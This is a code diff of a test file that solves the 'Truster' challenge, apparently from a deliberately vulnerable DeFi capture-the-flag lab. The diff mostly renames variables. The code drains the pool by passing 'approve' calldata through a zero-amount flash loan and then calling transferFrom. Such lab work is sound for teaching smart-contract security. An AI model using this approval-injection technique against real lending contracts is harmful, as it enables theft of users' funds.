@@ -31,22 +31,22 @@ describe('[Challenge] Truster', function () {
          * borrow 0.
          */
         let calldata, allowanceAfter, allowanceBefore, currentAllowance;
-        this.pool = await this.pool.connect(attacker);
-        this.token = await this.token.connect(attacker);
+        pool = await pool.connect(player);
+        token = await token.connect(player);
 
-        calldata = this.token.interface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);
+        calldata = token.interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
         
-        allowanceBefore = await this.token.allowance(this.pool.address, attacker.address);
+        allowanceBefore = await token.allowance(pool.address, player.address);
         allowanceBefore = ethers.utils.formatEther(allowanceBefore);
 
-        await this.pool.flashLoan(0, this.pool.address, this.token.address, calldata);
+        await pool.flashLoan(0, pool.address, token.address, calldata);
         
-        currentAllowance = allowanceAfter = await this.token.allowance(this.pool.address, attacker.address)
+        currentAllowance = allowanceAfter = await token.allowance(pool.address, player.address)
         allowanceAfter = ethers.utils.formatEther(allowanceAfter);
         
         // console.log(`Allowance before: ${allowanceBefore}. Allowance after: ${allowanceAfter}.`);
 
-        await this.token.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
+        await token.transferFrom(pool.address, player.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
